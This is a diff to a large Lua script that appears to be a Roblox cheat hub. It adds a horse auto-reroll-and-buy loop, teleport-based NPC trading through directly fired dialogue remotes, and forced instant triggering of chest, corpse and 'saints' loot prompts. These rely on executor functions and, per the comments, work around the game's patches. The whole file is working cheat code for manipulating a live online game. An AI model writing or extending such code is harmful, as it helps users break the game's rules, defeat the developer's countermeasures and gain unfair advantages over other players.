+                end
+            end)
+            return allText
+        end
+        local HALF_BRACKETS = { "\xe3\x80\x8c", "\xe3\x80\x8d" }
+        local function hasMythicBrackets(text)
+            for _, br in ipairs(HALF_BRACKETS) do
+                if string.find(text, br, 1, true) then return true end
+            end
+            return false
+        end
+        local function findHorseNPC()
+            local npcFolder = workspace:FindFirstChild("NPC")
+            if not npcFolder then return nil end
+            local jimBridger = npcFolder:FindFirstChild("jim bridger") or npcFolder:FindFirstChild("Jim Bridger")
+            if not jimBridger then
+                for _, ch in ipairs(npcFolder:GetChildren()) do
+                    if ch:IsA("Model") and string.find(string.lower(ch.Name), "jim", 1, true) then
+                        jimBridger = ch
+                        break
+                    end
+                end
+            end
+            local jimPos = nil
+            if jimBridger then
+                pcall(function()
+                    local pp = jimBridger.PrimaryPart or jimBridger:FindFirstChild("HumanoidRootPart") or jimBridger:FindFirstChild("Head")
+                    if pp then jimPos = pp.Position end
+                end)
+            end
+            local candidates = {}
+            for _, model in ipairs(npcFolder:GetChildren()) do
+                if model:IsA("Model") and model ~= jimBridger then
+                    local cd = model:FindFirstChildOfClass("ClickDetector", true)
+                    if not cd then
+                        for _, d in ipairs(model:GetDescendants()) do
+                            if d:IsA("ClickDetector") then cd = d; break end
+                        end
+                    end
+                    if cd then
+                        local pos = nil
+                        pcall(function()
+                            local pp = model.PrimaryPart or model:FindFirstChild("HumanoidRootPart") or model:FindFirstChild("Head")
+                            if pp then pos = pp.Position end
+                        end)
+                        if pos and jimPos and (pos - jimPos).Magnitude < 80 then
+                            table.insert(candidates, { model = model, cd = cd, dist = (pos - jimPos).Magnitude })
+                        end
+                    end
+                end
+            end
+            for _, stable in ipairs(workspace:GetDescendants()) do
+                if stable.Name == "Stable" and stable:IsA("Model") then
+                    local stablePos = nil
+                    pcall(function()
+                        local pp = stable.PrimaryPart or stable:FindFirstChildWhichIsA("BasePart")
+                        if pp then stablePos = pp.Position end
+                    end)
+                    if stablePos then
+                        for _, model in ipairs(npcFolder:GetChildren()) do
+                            if model:IsA("Model") then
+                                local cd = nil
+                                for _, d in ipairs(model:GetDescendants()) do
+                                    if d:IsA("ClickDetector") then cd = d; break end
+                                end
+                                if cd then
+                                    local pos = nil
+                                    pcall(function()
+                                        local pp = model.PrimaryPart or model:FindFirstChild("HumanoidRootPart")
+                                        if pp then pos = pp.Position end
+                                    end)
+                                    if pos and (pos - stablePos).Magnitude < 50 then
+                                        local already = false
+                                        for _, c in ipairs(candidates) do if c.model == model then already = true; break end end
+                                        if not already then
+                                            table.insert(candidates, { model = model, cd = cd, dist = (pos - stablePos).Magnitude })
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            table.sort(candidates, function(a, b) return a.dist < b.dist end)
+            if #candidates > 0 then return candidates[1] end
+            if jimPos then
+                for _, desc in ipairs(workspace:GetDescendants()) do
+                    if desc:IsA("ClickDetector") then
+                        local parent = desc.Parent
+                        if parent and parent:IsA("BasePart") then parent = parent.Parent end
+                        if parent and parent:IsA("Model") then
+                            local pos = nil
+                            pcall(function()
+                                local pp = parent.PrimaryPart or parent:FindFirstChild("HumanoidRootPart")
+                                if pp then pos = pp.Position end
+                            end)
+                            if pos and (pos - jimPos).Magnitude < 60 and parent:FindFirstChild("Humanoid") then
+                                return { model = parent, cd = desc, dist = (pos - jimPos).Magnitude }
+                            end
+                        end
+                    end
+                end
+            end
+            return nil
+        end
+        _G.fentiHorseRollLoop = function()
+            if horseRolling then return end
+            horseRolling = true
+            horseRollCount = 0
+            Library:Notify("Horse auto-roll started! Looking for mythical…", 5)
+            task.spawn(function()
+                local horseNPC = findHorseNPC()
+                if not horseNPC then
+                    Library:Notify("Horse NPC not found near jim bridger!", 5)
+                    horseRolling = false
+                    if Toggles and Toggles.AutoRollHorse then Toggles.AutoRollHorse:SetValue(false) end
+                    return
+                end
+                refreshCharacter()
+                local returnCF = humanoidRootPart and humanoidRootPart.CFrame
+                local npcModel = horseNPC.model
+                local npcCD = horseNPC.cd
+                local npcPos = nil
+                pcall(function()
+                    local pp = npcModel.PrimaryPart or npcModel:FindFirstChild("HumanoidRootPart") or npcModel:FindFirstChild("Head")
+                    if pp then npcPos = pp.Position end
+                end)
+                if npcPos and _G.fentiSoftTeleportTo then
+                    _G.fentiSoftTeleportTo(CFrame.new(npcPos + Vector3.new(0, 0, 4)), "horseRoll")
+                    task.wait(0.5)
+                end
+                if fireclickdetector then pcall(fireclickdetector, npcCD) end
+                task.wait(0.8)
+                while horseRolling do
+                    local text = getDialogueBodyText()
+                    if text == "" then
+                        if fireclickdetector then pcall(fireclickdetector, npcCD) end
+                        task.wait(1)
+                        text = getDialogueBodyText()
+                    end
+                    if text == "" then
+                        task.wait(0.5)
+                    else
+                        horseRollCount = horseRollCount + 1
+                        if hasMythicBrackets(text) then
+                            Library:Notify("MYTHICAL HORSE — roll #" .. horseRollCount .. " — buying…", 10)
+                            task.wait(0.3)
+                            local bought = false
+                            for _ = 1, 5 do
+                                local dlg = rawget(_G, "fentiDialogue")
+                                if dlg and type(dlg.clickChoiceByText) == "function" then
+                                    bought = dlg.clickChoiceByText({ "take it", "i'll take", "buy", "accept" })
+                                end
+                                if bought then break end
+                                task.wait(0.2)
+                            end
+                            if not bought then
+                                pcall(function()
+                                    local dlg = rawget(_G, "fentiDialogue")
+                                    if dlg and type(dlg.clickChoice) == "function" then dlg.clickChoice(1) end
+                                end)
+                            end
+                            Library:Notify("Mythical horse — done after " .. horseRollCount .. " rolls.", 10)
+                            horseRolling = false
+                            if Toggles and Toggles.AutoRollHorse then Toggles.AutoRollHorse:SetValue(false) end
+                            break
+                        else
+                            if horseRollCount % 20 == 0 then
+                                Library:Notify("Horse roll #" .. horseRollCount .. " — still searching…", 3)
+                            end
+                            local skipped = false
+                            for _ = 1, 3 do
+                                local dlg = rawget(_G, "fentiDialogue")
+                                if dlg and type(dlg.clickChoiceByText) == "function" then
+                                    skipped = dlg.clickChoiceByText({ "show me another", "another", "next", "reroll", "skip" })
+                                end
+                                if skipped then break end
+                                task.wait(0.15)
+                            end
+                            if not skipped then
+                                pcall(function()
+                                    local dlg = rawget(_G, "fentiDialogue")
+                                    if dlg and type(dlg.clickChoice) == "function" then dlg.clickChoice(2) end
+                                end)
+                            end
+                            task.wait(0.35)
+                        end
+                    end
+                end
+                if returnCF and _G.fentiSoftTeleportTo then _G.fentiSoftTeleportTo(returnCF, "horseRollReturn") end
+                horseRolling = false
+            end)
+        end
+        _G.fentiHorseRollStop = function()
+            horseRolling = false
+            Library:Notify("Horse auto-roll stopped. Total rolls: " .. horseRollCount, 5)
+        end
+    end)()
     
     local function fentiBriefVelocityDamp(hrp, frames)
         frames = frames or 6
@@ -3103,7 +3557,7 @@ do
             acc = acc + dt
             if acc < 0.22 then return end
             acc = 0
-            if isRunning and originalPosition and humanoidRootPart and not chestFarmEnabled then
+            if isRunning and originalPosition and humanoidRootPart then
                 local drift = (humanoidRootPart.Position - originalPosition).Magnitude
                 if drift > 5 and not rawget(_G, "fentiFishingNoSnap") then
                     pcall(function()
@@ -3166,7 +3620,7 @@ do
         local function pnp(center, radius)
             radius = radius or 60
             local rSq = radius * radius
-            local budget = 950
+            local budget = 420
             pcall(function()
                 local stack = {}
                 for _, ch in ipairs(workspace:GetChildren()) do
@@ -3242,55 +3696,171 @@ do
     -- ----------------------------------------------------------------------------
     -- [FENTI-15] 15. SHOP / NPC / BANK + PROXIMITY
     -- ----------------------------------------------------------------------------
-    -- --- NPC + Daniel shop + bank (remote dialogue) ---
-    local function npcAction(action, npcModel)
-        if not npcModel then Library:Notify("NPC not found!", 3); return end
-        if not DialogueRemote then Library:Notify("DialogueRemote not found!", 3); return end
-        pcall(function() DialogueRemote:FireServer("Action", action, npcModel) end)
-    end
-    local function danielAction(action) npcAction(action, workspace:FindFirstChild("NPC") and workspace.NPC:FindFirstChild("Daniel")) end
-    local function sellAllFish()
-        for _, fish in ipairs({"Bass", "Snapper", "Cod"}) do danielAction("SellAll_" .. fish); task.wait(0.5) end
-    end
-    local function autoSellLoop()
-        while autoSellFish do
-            sellAllFish(); Library:Notify("Auto-sold all fish!", 2)
-            task.wait(Options.AutoSellDelay and Options.AutoSellDelay.Value or 60)
+    -- NPC + Daniel shop live in an IIFE — eight fewer locals on the main chunk (Luau ~200 register cap).
+    ;(function()
+        local function fentiFindNPCModelByName(folder, want)
+            if not folder or type(want) ~= "string" then return nil end
+            local lower = string.lower(want)
+            local direct = folder:FindFirstChild(want) or folder:FindFirstChild(want:sub(1, 1):upper() .. want:sub(2))
+            if direct then return direct end
+            for _, ch in ipairs(folder:GetChildren()) do
+                if ch:IsA("Model") and string.lower(ch.Name) == lower then return ch end
+            end
+            return nil
         end
-    end
-    local function buyAmmoPack()
-        local npcFolder = workspace:FindFirstChild("NPC")
-        if not npcFolder then return end
-        danielAction("Buy_AmmoPack"); task.wait(0.3)
-        for _, npcName in ipairs({"Flint", "Samuel1", "Drock2", "Silas", "Loded1"}) do
-            local npc = npcFolder:FindFirstChild(npcName)
-            if npc then npcAction("Buy_AmmoPack", npc); task.wait(0.2); npcAction("Buy_Ammo", npc); task.wait(0.2) end
+        -- One remote per call (SimpleSpy shape). No Talk/Open here — that was spamming DialogueRemote every ammo NPC + lagging the client.
+        local function npcAction(action, npcModel)
+            if not npcModel then Library:Notify("NPC not found!", 3); return end
+            if not DialogueRemote then Library:Notify("DialogueRemote not found!", 3); return end
+            pcall(function() DialogueRemote:FireServer(unpack({ "Action", action, npcModel })) end)
         end
-    end
-    
-    local function getNPCList()
-        local list = {}
-        local npcFolder = workspace:FindFirstChild("NPC")
-        if npcFolder then for _, ch in pairs(npcFolder:GetChildren()) do if ch:IsA("Model") then table.insert(list, ch.Name) end end end
-        table.sort(list); return list
-    end
-    local function getNPCModel(npcName)
-        local npcFolder = workspace:FindFirstChild("NPC")
-        return npcFolder and npcFolder:FindFirstChild(npcName)
-    end
-    local function teleportToNPC(npcName)
-        local npc = getNPCModel(npcName)
-        if not npc then Library:Notify("NPC not found: " .. npcName, 3); return end
-        refreshCharacter()
-        if humanoidRootPart then
-            local pos; pcall(function() pos = npc:IsA("Model") and npc:GetPivot().Position or npc.Position end)
-            if pos then smartTeleport(CFrame.new(pos + Vector3.new(0, 3, 0))); Library:Notify("Teleported to " .. npcName, 3) end
+        -- Daniel fish shop: open channel once, then a single Action (still only 3 remotes total per click).
+        local function danielAction(action)
+            local npcFolder = workspace:FindFirstChild("NPC")
+            local daniel = npcFolder and (fentiFindNPCModelByName(npcFolder, "Daniel") or fentiFindNPCModelByName(npcFolder, "daniel"))
+            if not daniel then Library:Notify("Daniel not found!", 3); return end
+            if not DialogueRemote then Library:Notify("DialogueRemote not found!", 3); return end
+            refreshCharacter()
+            local dpos
+            pcall(function()
+                dpos = daniel:IsA("Model") and daniel:GetPivot().Position or (daniel:IsA("BasePart") and daniel.Position)
+            end)
+            if dpos then
+                smartTeleport(CFrame.new(dpos + Vector3.new(0, 3, 4)))
+                task.wait(0.35)
+            end
+            local nm = daniel.Name
+            pcall(function() DialogueRemote:FireServer("Talk", nm, daniel) end)
+            pcall(function() DialogueRemote:FireServer("Open", nil, daniel, 15, "Start") end)
+            task.wait(0.08)
+            pcall(function() DialogueRemote:FireServer(unpack({ "Action", action, daniel })) end)
         end
-    end
+        -- Fish sells: remote-only (no TP / Talk / Open) — same as legacy hub; auto-sell stays smooth.
+        local function danielSellRemote(action)
+            local npcFolder = workspace:FindFirstChild("NPC")
+            local daniel = npcFolder and (fentiFindNPCModelByName(npcFolder, "Daniel") or fentiFindNPCModelByName(npcFolder, "daniel"))
+            if not daniel then Library:Notify("Daniel not found!", 3); return end
+            npcAction(action, daniel)
+        end
+        rawset(_G, "fentiDanielSellRemote", danielSellRemote)
+        local function sellAllFish()
+            for _, fish in ipairs({"Bass", "Snapper", "Cod"}) do
+                danielSellRemote("SellAll_" .. fish)
+                task.wait(0.5)
+            end
+        end
+        local function autoSellLoop()
+            while autoSellFish do
+                sellAllFish(); Library:Notify("Auto-sold all fish!", 2)
+                task.wait(Options.AutoSellDelay and Options.AutoSellDelay.Value or 60)
+            end
+        end
+        local function buyAmmoPack()
+            local npcFolder = workspace:FindFirstChild("NPC")
+            if not npcFolder then return end
+            -- Ammo is from gun vendors — do not open Daniel's dialogue (was remote spam + wrong UI).
+            local vendors = { "Flint", "Samuel1", "Drock2", "Silas", "Loded1" }
+            for _, npcName in ipairs(vendors) do
+                local npc = npcFolder:FindFirstChild(npcName)
+                if npc then
+                    npcAction("Buy_AmmoPack", npc)
+                    task.wait(0.45)
+                    npcAction("Buy_Ammo", npc)
+                    task.wait(0.45)
+                end
+            end
+        end
+        local function getNPCList()
+            local list = {}
+            local npcFolder = workspace:FindFirstChild("NPC")
+            if npcFolder then for _, ch in pairs(npcFolder:GetChildren()) do if ch:IsA("Model") then table.insert(list, ch.Name) end end end
+            table.sort(list); return list
+        end
+        local function getNPCModel(npcName)
+            local npcFolder = workspace:FindFirstChild("NPC")
+            return npcFolder and npcFolder:FindFirstChild(npcName)
+        end
+        local function teleportToNPC(npcName)
+            local npc = getNPCModel(npcName)
+            if not npc then Library:Notify("NPC not found: " .. npcName, 3); return end
+            refreshCharacter()
+            if humanoidRootPart then
+                local pos; pcall(function() pos = npc:IsA("Model") and npc:GetPivot().Position or npc.Position end)
+                if pos then smartTeleport(CFrame.new(pos + Vector3.new(0, 3, 0))); Library:Notify("Teleported to " .. npcName, 3) end
+            end
+        end
+        rawset(_G, "fentiGetNPCModel", getNPCModel)
+        rawset(_G, "fentiTeleportToNPC", teleportToNPC)
+        rawset(_G, "fentiGetNPCList", getNPCList)
+        rawset(_G, "fentiDanielAction", danielAction)
+        rawset(_G, "fentiSellAllFish", sellAllFish)
+        rawset(_G, "fentiAutoSellLoop", autoSellLoop)
+        rawset(_G, "fentiBuyAmmoPack", buyAmmoPack)
+        -- SimpleSpy: DialogueRemote:FireServer("Action", "Buy_LumberAxe", workspace.NPC.ChuckB) — must be near NPC.
+        local function buyLumberAxe()
+            local npcFolder = workspace:FindFirstChild("NPC")
+            local chuck = npcFolder and (npcFolder:FindFirstChild("ChuckB") or fentiFindNPCModelByName(npcFolder, "ChuckB"))
+            if not chuck then Library:Notify("NPC ChuckB not found (workspace.NPC).", 4); return end
+            if not DialogueRemote then Library:Notify("DialogueRemote not found!", 3); return end
+            refreshCharacter()
+            local pos
+            pcall(function()
+                pos = chuck:IsA("Model") and chuck:GetPivot().Position or (chuck:IsA("BasePart") and chuck.Position)
+            end)
+            if not pos then
+                local pp = chuck:IsA("Model") and (chuck.PrimaryPart or chuck:FindFirstChildWhichIsA("BasePart"))
+                if pp then pos = pp.Position end
+            end
+            if not pos then Library:Notify("Could not get ChuckB position.", 4); return end
+            smartTeleport(CFrame.new(pos + Vector3.new(0, 3, 4)))
+            task.wait(0.4)
+            local nm = chuck.Name
+            pcall(function() DialogueRemote:FireServer("Talk", nm, chuck) end)
+            pcall(function() DialogueRemote:FireServer("Open", nil, chuck, 15, "Start") end)
+            task.wait(0.08)
+            pcall(function() DialogueRemote:FireServer(unpack({ "Action", "Buy_LumberAxe", chuck })) end)
+            Library:Notify("Buy lumber axe — request sent (ChuckB).", 3)
+        end
+        rawset(_G, "fentiBuyLumberAxe", buyLumberAxe)
+        -- SimpleSpy: DialogueRemote:FireServer("Action", "Sell_Wood", workspace.NPC.ChuckB) — TP near Chuck like buy axe.
+        local function chuckSellWoodRemote()
+            local npcFolder = workspace:FindFirstChild("NPC")
+            local chuck = npcFolder and (npcFolder:FindFirstChild("ChuckB") or fentiFindNPCModelByName(npcFolder, "ChuckB"))
+            if not chuck then Library:Notify("ChuckB not found.", 3); return end
+            if not DialogueRemote then Library:Notify("DialogueRemote not found!", 3); return end
+            refreshCharacter()
+            local pos
+            pcall(function()
+                pos = chuck:IsA("Model") and chuck:GetPivot().Position or (chuck:IsA("BasePart") and chuck.Position)
+            end)
+            if not pos then
+                local pp = chuck:IsA("Model") and (chuck.PrimaryPart or chuck:FindFirstChildWhichIsA("BasePart"))
+                if pp then pos = pp.Position end
+            end
+            if pos then
+                smartTeleport(CFrame.new(pos + Vector3.new(0, 3, 4)))
+                task.wait(0.35)
+            end
+            pcall(function() DialogueRemote:FireServer("Action", "Sell_Wood", chuck) end)
+        end
+        rawset(_G, "fentiChuckSellWoodRemote", chuckSellWoodRemote)
+        local function autoSellWoodLoop()
+            while autoSellWood do
+                pcall(chuckSellWoodRemote)
+                local d = 75
+                pcall(function()
+                    local o = Options and Options.AutoSellWoodDelay
+                    if o and type(o.Value) == "number" then d = math.clamp(o.Value, 12, 600) end
+                end)
+                task.wait(d)
+            end
+        end
+        rawset(_G, "fentiAutoSellWoodLoop", autoSellWoodLoop)
+    end)()
     
     -- --- ProximityPrompt: fire helpers + radius scanner (true IIFE — separate prototype; avoids PARSER_LOCAL_LIMIT) ---
     -- Do not forward-declare safeFire/fireAll/etc. here — six extra locals push the parent chunk over Luau's ~200 register limit.
-    (function()
+    ;(function()
     _G.fentiRadiusPromptStop = false
     -- rawget(_G, …) so a rename/minify pass cannot break the native prompt API name.
     local function fentiTryGlobalFireProximityPrompt(p)
@@ -3298,6 +3868,13 @@ do
         if type(fpp) ~= "function" then return end
         pcall(fpp, p)
         pcall(fpp, p, 0)
+    end
+
+    local function fentiProximityPromptCheckNotify(p)
+        pcall(function()
+            local ev = RS:FindFirstChild("Events") and RS.Events:FindFirstChild("ProximityPromptCheck")
+            if ev and ev:IsA("RemoteEvent") and p then ev:FireServer(p) end
+        end)
     end
 
     -- ProximityPrompt action key (games often use E; respect prompt.KeyboardKeyCode when set).
@@ -3445,6 +4022,7 @@ do
     -- Chest-only true instant: HoldDuration 0 + fireproximityprompt + Triggered (no long VIM bar — that reset halfway).
     local function fentiFireChestProximityInstant(prompt)
         if not prompt or not prompt:IsA("ProximityPrompt") then return false end
+        fentiProximityPromptCheckNotify(prompt)
         local oldHold = prompt.HoldDuration
         local oldMax = prompt.MaxActivationDistance
         local oldEnabled = prompt.Enabled
@@ -3486,6 +4064,58 @@ do
     end
     _G.fentiFireChestProximityInstant = fentiFireChestProximityInstant
     
+    -- Corpse / loot: longer real hold + burst (game patched short chest-style instant on corpse prompts).
+    local function fentiFireCorpseProximityInstant(prompt)
+        if not prompt or not prompt:IsA("ProximityPrompt") then return false end
+        fentiProximityPromptCheckNotify(prompt)
+        local oldHold = prompt.HoldDuration
+        local oldMax = prompt.MaxActivationDistance
+        local oldEnabled = prompt.Enabled
+        local oldLos = prompt.RequiresLineOfSight
+        pcall(function()
+            prompt.HoldDuration = 0
+            prompt.MaxActivationDistance = math.min(FENTI_PROMPT_MAX_STRETCH, math.max(oldMax > 0.05 and oldMax or 10, 34))
+            prompt.Enabled = true
+            prompt.RequiresLineOfSight = false
+        end)
+        task.wait(0.018)
+        fentiTryGlobalFireProximityPrompt(prompt)
+        if typeof(getconnections) == "function" then
+            pcall(function()
+                for _, conn in pairs(getconnections(prompt.Triggered)) do
+                    if conn.Fire then pcall(function() conn:Fire(player) end) end
+                end
+            end)
+        end
+        if typeof(firesignal) == "function" then
+            pcall(function() firesignal(prompt.Triggered, player) end)
+        end
+        pcall(function()
+            prompt:InputHoldBegin()
+            task.wait(0.24)
+            prompt:InputHoldEnd()
+        end)
+        fentiTryGlobalFireProximityPrompt(prompt)
+        if VIM then
+            local kc = fentiGetProximityPromptKeyCode(prompt)
+            local baseH = 0.55
+            pcall(function() baseH = tonumber(oldHold) or 0.55 end)
+            local holdSec = math.clamp(baseH + 0.62, 0.68, 3.5)
+            pcall(function() prompt:InputHoldBegin() end)
+            fentiVimHoldKeyCode(kc, holdSec)
+            pcall(function() prompt:InputHoldEnd() end)
+        end
+        fentiTryGlobalFireProximityPrompt(prompt)
+        pcall(function()
+            prompt:InputHoldBegin()
+            task.wait(0.07)
+            prompt:InputHoldEnd()
+        end)
+        fentiRestorePromptProps(prompt, oldHold, oldMax, oldEnabled, oldLos, 0.58)
+        return true
+    end
+    _G.fentiFireCorpseProximityInstant = fentiFireCorpseProximityInstant
+    
     -- Radius-only proximity assist (replaces workspace-wide instant prompts — avoids lag)
     local FENTI_RADIUS_CHEST_CORPSE_SAINTS_HORSE = 25
     -- Insta-prompt: parts under workspace.saints.Entities are often >25 studs from you until TP; slightly looser.
@@ -3522,8 +4152,10 @@ do
     _G.fentiGetChestFolderRoots = fentiGetChestFolderRoots
     -- Shared cooldown: radius “instant” tick + AutoCollect must not double-tap the same chest prompt.
     _G.fentiChestPromptLastFire = rawget(_G, "fentiChestPromptLastFire") or setmetatable({}, { __mode = "k" })
+    _G.fentiCorpsePromptLastFire = rawget(_G, "fentiCorpsePromptLastFire") or setmetatable({}, { __mode = "k" })
     _G.fentiSaintsInstaPromptLastFire = rawget(_G, "fentiSaintsInstaPromptLastFire") or setmetatable({}, { __mode = "k" })
     local FENTI_CHEST_PROMPT_COOLDOWN = 0.48
+    local FENTI_CORPSE_PROMPT_COOLDOWN = 0.52
     local FENTI_SAINTS_INSTA_PROMPT_COOLDOWN = 0.68
     -- Chest reel (fishing): AutoCollect loop is off while isRunning — spam prompts when NotificationEvent says chest.
     _G.fentiSpamNearbyChestPrompts = function(radius, rounds, delayBetween)
@@ -3588,6 +4220,33 @@ do
         end
         return false
     end
+    local function icorpse(prompt)
+        if not prompt or not prompt:IsA("ProximityPrompt") then return false end
+        if ichest(prompt) then return false end
+        local p = prompt.Parent
+        while p and p ~= game do
+            if p.Name == "CorpseSpawn" then return true end
+            local par = p.Parent
+            if par and par.Name == "CorpseParts" then return true end
+            p = par
+        end
+        return false
+    end
+    local function isaints(prompt)
+        if not prompt or not prompt:IsA("ProximityPrompt") then return false end
+        if ichest(prompt) or icorpse(prompt) then return false end
+        local p = prompt.Parent
+        while p and p ~= game do
+            if p:IsA("BasePart") then
+                local n = string.lower(p.Name)
+                if string.find(n, "saints", 1, true) or string.find(n, "saint", 1, true) then
+                    return true
+                end
+            end
+            p = p.Parent
+        end
+        return false
+    end
     local function fentiRadiusProximityTick()
         if _G.fentiRadiusPromptStop then return end
         if not Toggles then return end
@@ -3606,7 +4265,7 @@ do
         local rZone = FENTI_RADIUS_CHEST_CORPSE_SAINTS_HORSE
         -- Chest instant: primary path is IY-style PromptButtonHoldBegan -> fireproximityprompt (see fentiConnectIYChestInstantPP).
         -- Here we only patch range; if executor has no fireproximityprompt, fall back to one-shot instant per prompt.
-        if Toggles.InstantPromptChest and Toggles.InstantPromptChest.Value then
+        if Toggles.FentiUnifiedChests and Toggles.FentiUnifiedChests.Value then
             local rChestInstant = 52
             local rootsR = fentiGetChestFolderRoots()
             local nearChestPrompts = {}
@@ -3645,16 +4304,21 @@ do
             end
         end
     
-        local saintsInstaArm = saintsEnabled and Toggles.InstantPromptSaints and Toggles.InstantPromptSaints and Toggles.InstantPromptSaints.Value
-        if Toggles.InstantPromptCorpse and Toggles.InstantPromptCorpse.Value then
+        local unifiedLoot = Toggles.FentiUnifiedLootPrompts and Toggles.FentiUnifiedLootPrompts.Value
+        local saintsInstaArm = saintsEnabled and unifiedLoot
+        if unifiedLoot then
+            local rCorpse = 54
+            local nearCorpsePrompts = {}
+            local function pushCorpsePrompt(pr)
+                if pr then nearCorpsePrompts[#nearCorpsePrompts + 1] = pr end
+            end
             local folder = workspace:FindFirstChild("CorpseSpawns")
             if folder then
                 for _, spawn in ipairs(folder:GetChildren()) do
                     if spawn.Name == "CorpseSpawn" then
                         local part = spawn:IsA("BasePart") and spawn or spawn:FindFirstChildWhichIsA("BasePart")
-                        if part and (part.Position - root.Position).Magnitude <= rZone then
-                            local prompt = spawn:FindFirstChildWhichIsA("ProximityPrompt", true)
-                            if prompt then fentiDeferSafeProximityFire(prompt) end
+                        if part and (part.Position - root.Position).Magnitude <= rCorpse then
+                            pushCorpsePrompt(spawn:FindFirstChildWhichIsA("ProximityPrompt", true))
                         end
                     end
                 end
@@ -3664,10 +4328,28 @@ do
                 for _, p in ipairs(corpseParts:GetChildren()) do
                     if not p:IsA("BasePart") or not fentiSaintsPartEligible(p.Name) then
                     elseif saintsInstaArm then
-                        -- Saints insta owns these prompts; Corpse tick skips them so hold bar is not reset twice.
-                    elseif (p.Position - root.Position).Magnitude <= rZone then
-                        local prompt = p:FindFirstChildWhichIsA("ProximityPrompt", true)
-                        if prompt then fentiDeferSafeProximityFire(prompt) end
+                    elseif (p.Position - root.Position).Magnitude <= rCorpse then
+                        pushCorpsePrompt(p:FindFirstChildWhichIsA("ProximityPrompt", true))
+                    end
+                end
+            end
+            if #nearCorpsePrompts > 0 then
+                local nowT = tick()
+                local nx = rawget(_G, "fentiCorpseRadiusInstantPatchNext") or 0
+                if nowT >= nx then
+                    _G.fentiCorpseRadiusInstantPatchNext = nowT + 0.88
+                    pcall(function() patchNearbyPrompts(root.Position, rCorpse + 24) end)
+                end
+                local lastT = _G.fentiCorpsePromptLastFire
+                local clk = os.clock()
+                for _, pr in ipairs(nearCorpsePrompts) do
+                    local last = lastT[pr]
+                    if not last or (clk - last) >= FENTI_CORPSE_PROMPT_COOLDOWN then
+                        lastT[pr] = clk
+                        local pp = pr
+                        task.defer(function()
+                            pcall(fentiFireCorpseProximityInstant, pp)
+                        end)
                     end
                 end
             end
@@ -3805,8 +4487,8 @@ do
                     local rootsChest = fentiGetChestFolderRoots()
                     if #rootsChest == 0 then return end
                     local instaChest = true
-                    if Toggles and Toggles.InstantPromptChest ~= nil then
-                        instaChest = Toggles.InstantPromptChest.Value == true
+                    if Toggles and Toggles.FentiUnifiedChests ~= nil then
+                        instaChest = Toggles.FentiUnifiedChests.Value == true
                     end
                     local nearChest = false
                     for _, chests in ipairs(rootsChest) do
@@ -3969,6 +4651,8 @@ do
         fireAllPrompts = fap,
     }
     _G.fentiIsChestProximityPrompt = ichest
+    _G.fentiIsCorpseProximityPrompt = icorpse
+    _G.fentiIsSaintsProximityPrompt = isaints
     -- Infinite Yield "instantproximityprompts" / instantpp: PromptButtonHoldBegan -> fireproximityprompt (chest prompts only).
     local fentiIYChestInstantConn = nil
     _G.fentiDisconnectIYChestInstantPP = function()
@@ -3995,14 +4679,61 @@ do
         end
         return false
     end
+    -- One IY hook for corpse + saints (not chests — those stay on FentiUnifiedChests).
+    local fentiIYLootInstantConn = nil
+    _G.fentiDisconnectIYLootInstantPP = function()
+        if fentiIYLootInstantConn then
+            pcall(function() fentiIYLootInstantConn:Disconnect() end)
+            fentiIYLootInstantConn = nil
+        end
+    end
+    _G.fentiConnectIYLootInstantPP = function()
+        _G.fentiDisconnectIYLootInstantPP()
+        if not ProximityPromptService then return false end
+        local ok, conn = pcall(function()
+            return ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
+                if not prompt or not prompt:IsA("ProximityPrompt") then return end
+                if ichest(prompt) then return end
+                local fpp = rawget(_G, "fireproximityprompt")
+                if icorpse(prompt) then
+                    if type(fpp) == "function" then
+                        pcall(fpp, prompt)
+                        pcall(fpp, prompt, 0)
+                    end
+                    task.defer(function()
+                        pcall(fentiFireCorpseProximityInstant, prompt)
+                    end)
+                    return
+                end
+                if isaints(prompt) then
+                    if type(fpp) == "function" then
+                        pcall(fpp, prompt)
+                        pcall(fpp, prompt, 0)
+                    end
+                    task.defer(function()
+                        pcall(fentiFireChestProximityInstant, prompt)
+                    end)
+                end
+            end)
+        end)
+        if ok and conn then
+            fentiIYLootInstantConn = conn
+            return true
+        end
+        return false
+    end
+    _G.fentiDisconnectIYCorpseInstantPP = _G.fentiDisconnectIYLootInstantPP
+    _G.fentiDisconnectIYSaintsInstantPP = _G.fentiDisconnectIYLootInstantPP
+    _G.fentiConnectIYCorpseInstantPP = _G.fentiConnectIYLootInstantPP
+    _G.fentiConnectIYSaintsInstantPP = _G.fentiConnectIYLootInstantPP
     end)()
     
     do
     (function()
         local function openBank()
-            local banker = getNPCModel("Banker")
+            local banker = _G.fentiGetNPCModel("Banker")
             if not banker then Library:Notify("Banker NPC not found!", 3); return end
-            teleportToNPC("Banker"); task.wait(0.5)
+            _G.fentiTeleportToNPC("Banker"); task.wait(0.5)
             local promptFired = _G.FentiProximity and _G.FentiProximity.fireAllPrompts and _G.FentiProximity.fireAllPrompts(banker)
             if not promptFired and DialogueRemote then
                 pcall(function() DialogueRemote:FireServer("Open", {["Start"] = {["Choices"] = {[1] = {["ServerAction"] = "OpenBank", ["Text"] = "Open Storage"}, [2] = {["Quit"] = true, ["Text"] = "Nevermind."}}, ["Text"] = "Need to stash something safely?"}}, banker, 15, "Start") end)
@@ -4013,9 +4744,9 @@ do
             if openStorageRemote then pcall(function() openStorageRemote:FireServer() end) end
         end
         local function talkToNPC(npcName)
-            local npc = getNPCModel(npcName)
+            local npc = _G.fentiGetNPCModel(npcName)
             if not npc then Library:Notify("NPC not found: " .. npcName, 3); return end
-            teleportToNPC(npcName); task.wait(0.5)
+            _G.fentiTeleportToNPC(npcName); task.wait(0.5)
             if _G.FentiProximity and _G.FentiProximity.fireAllPrompts and _G.FentiProximity.fireAllPrompts(npc) then Library:Notify("Interacted with " .. npcName, 3); return end
             if DialogueRemote then
                 pcall(function() DialogueRemote:FireServer("Talk", npcName, npc) end); task.wait(0.2)
@@ -4122,8 +4853,66 @@ do
         if not clicked then tryDialogueRemoteChoice(choiceNumber) end
         return clicked
     end
+    local function clickDialogueChoiceByText(needles)
+        local gui = getDialogueGui()
+        if not gui or not gui.Enabled then return false end
+        local listNeedles = {}
+        if type(needles) == "string" then
+            listNeedles[1] = string.lower(needles)
+        elseif type(needles) == "table" then
+            for _, n in ipairs(needles) do
+                if type(n) == "string" and n ~= "" then
+                    listNeedles[#listNeedles + 1] = string.lower(n)
+                end
+            end
+        end
+        if #listNeedles == 0 then return false end
